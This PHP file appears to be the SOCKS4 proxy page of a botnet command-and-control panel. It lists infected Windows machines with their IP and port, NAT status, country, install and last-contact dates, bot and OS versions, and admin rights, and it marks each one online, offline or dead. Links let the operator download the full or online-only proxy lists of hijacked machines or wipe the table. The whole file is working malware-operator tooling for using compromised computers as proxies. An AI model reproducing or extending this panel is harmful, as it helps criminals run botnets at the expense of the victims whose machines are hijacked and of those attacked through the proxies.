<?php

if($act=="socks4")
	{
	$limit=isset($_POST['limit'])?(float)$_POST['limit']:30;
	switch($subact)
		{
		case "getalllist":
			$qres=mysql_query("SELECT * FROM bots RIGHT JOIN socks4 ON bots.id=socks4.id ORDER BY bots.ldate DESC") or die(mysql_error());
			while($row=mysql_fetch_assoc($qres)){$content.=long2ip($row['ip']).":".$row['port']."\r\n";}
			header("Content-Type: text/plain");
			header('Content-Disposition: attachment; filename="all_list.txt"');
			die(rtrim($content));
			break;
		case "getonlinelist":
			$qres=mysql_query("SELECT * FROM bots RIGHT JOIN socks4 ON bots.id=socks4.id WHERE $timestamp-ldate<=$online_limit ORDER BY bots.ldate DESC") or die(mysql_error());
			while($row=mysql_fetch_assoc($qres)){$content.=long2ip($row['ip']).":".$row['port']."\r\n";}
			header("Content-Type: text/plain");
			header('Content-Disposition: attachment; filename="online_list.txt"');
			die(rtrim($content));
			break;
		case "delall":
			mysql_query("DELETE FROM socks4") or die(mysql_error());
			break;
		}
	
	$bots=mysql_query("SELECT * FROM bots RIGHT JOIN socks4 ON bots.id=socks4.id ORDER BY bots.ldate DESC LIMIT $limit") or die(mysql_error());
	$total_bots=mysql_num_rows($bots);

	
	$qres=mysql_query("SELECT bots.id FROM bots RIGHT JOIN socks4 ON bots.id=socks4.id WHERE $timestamp-ldate<=$online_limit") or die(mysql_error());
	$dyn="<tr><td class=\"me\"><table width=100% cellspacing=0>";
	$dyn.="<tr><td><font class=\"mt\">Total:</font></td><td align=\"right\"><font class=\"mt\">$total_bots</font></td></tr>";
	$dyn.="<tr><td><font class=\"mt\">Online:</font></td><td align=\"right\"><font class=\"mt\">".mysql_num_rows($qres)."</font></td></tr>";
	$dyn.="</table></td></tr>";

	$left_menu.=str_replace("<php:caption>","Counters",MENU);
	$left_menu=str_replace("<php:content>",$dyn,$left_menu);

	$dyn="<tr><td class=\"me\"><a class=\"mt\" href=\"index.php?act=socks4&subact=getalllist\">Download ALL socks list</a></td></tr>";
	$dyn.="<tr><td class=\"me\"><a class=\"mt\" href=\"index.php?act=socks4&subact=getonlinelist\">Download online only list</a></td></tr>";
	$dyn.="<tr><td class=\"me\"><a class=\"mt\" href=\"index.php?act=socks4&subact=delall\" onclick=\"return confirm('Are you sure?');\">Clean Socks4 table</a></td></tr>";

	$left_menu.=str_replace("<php:caption>","Actions",MENU);
	$left_menu=str_replace("<php:content>",$dyn,$left_menu);
	
if($total_bots!=0)
	{
	unset($dyn);
	$back=false;
	while($row=mysql_fetch_assoc($bots))
		{
		if($back)
			{$dyn.="<tr style=\"background-color:#FFFFB4\">";}
		else
			{$dyn.="<tr style=\"background-color:White\">";}
		$back=!$back;
		$dyn.="<td class=\"te\" style=\"text-align:center; padding:0px\"><font>".sprintf("%08X",(float)$row["id"])."</font></td>";
		$dyn.="<td class=\"te\" style=\"text-align:center; padding:0px\"><font>".sprintf("%08X",(float)$row["bid"])."</font></td>";
		
		$nat=$row["nat"]?" (NAT)":"";
		$dyn.="<td class=\"te\"><font>".long2ip($row["ip"]).":$row[port] $nat</font></td>";
		
		$dyn.="<td class=\"te\"><div class=\"geo geo_".$ccode[$row["cnum"]]."\"></div><font style=\"padding-left:5px\">(".$ccode[$row["cnum"]].")</font></td>";
		
		$dyn.="<td class=\"te\"><font>".date("H:i:s d M",$row["idate"])."</font></td>";
		$dyn.="<td class=\"te\"><font>".date("H:i:s d M",$row["ldate"])."</font></td>";
		$dyn.="<td class=\"te\" style=\"text-align:center; padding:0px\"><font>#$row[ltask]</font></td>";
		
		$version=substr(sprintf("%04X",$row["bot_version"]),0,2).".".substr(sprintf("%04X",$row["bot_version"]),2,2);
		$dyn.="<td class=\"te\" style=\"text-align:center; padding:0px\"><font>$version</font></td>";
		
				switch(sprintf("%04X",$row["os_version"]))
					{
					case "0500": $version="Win2000"; break;
					case "0501": $version="WinXP"; break;
					case "0502": $version="Win2003"; break;
					case "0600": $version="WinVista"; break;
					case "0601": $version="Win7"; break;
					default: $version=substr(sprintf("%04X",$row["os_version"]),0,2).".".substr(sprintf("%04X",$row["os_version"]),2,2);
					}
				$a=$row['x64']==1?"64":"86";
				$r=$row['admin']==1?"A":"U";
				$dyn.="<td class=\"te\" style=\"text-align:center; padding:0px\"><font>$version x$a ($r)</font></td>";
		
		if($timestamp-$row["ldate"]<$online_limit)
			{$dyn.="<td width=50px class=\"tel\" style=\"background-color:lightgreen; text-align:center;\"><font>Online</font></td>";}
		elseif($timestamp-$row["ldate"]>$dead_limit)
			{$dyn.="<td width=50px class=\"tel\" style=\"background-color:black; text-align:center;\"><font color=\"white\">Dead</font></td>";}
		else{$dyn.="<td width=50px class=\"tel\" style=\"background-color:lightcoral; text-align:center;\"><font>Offline</font></td>";}
		
		$dyn.="</tr>";
		}
	$content="<table width=300 align=\"left\" cellspacing=0><tr><td class=\"mh\"><font class=\"mht\">Options</font></td></tr><tr><td class=\"me\"><br><form method=\"post\" action=\"?act=socks4\"><table cellspacing=0 width=100%><tr><td width=100px align=\"right\" style=\"padding-right:10px\"><font>Records limit:</font></td><td><input type=\"text\" name=\"limit\" value=\"$limit\"/></td></tr><tr><td></td><td><input type=\"submit\" class=\"i_submit\" value=\"Apply\"></td></tr></table></form></td></tr></table><table cellspacing=0 width=100% style=\"padding-top:10px\"><tr><th width=80px class=\"th\"><font>Bot ID</font></th><th width=80px class=\"th\"><font>Build ID</font></th><th class=\"th\"><font>IP:port</font></th><th class=\"th\"><font>Country</font></th><th class=\"th\"><font>Install date</font></th><th class=\"th\"><font>Last response</font></th><th width=60px class=\"th\"><font>Task</font></th><th width=60px class=\"th\"><font>Bot ver.</font></th><th width=100px class=\"th\"><font>OS version</font></th><th width=60px class=\"thl\"><font>Status</font></th></tr>$dyn</table>";	
	}else{$content="<div class=\"mess_err\"><font style=\"font-weight:bold\">Socks list is empty.</font></div><br>";}
$parsed=true;
}

?>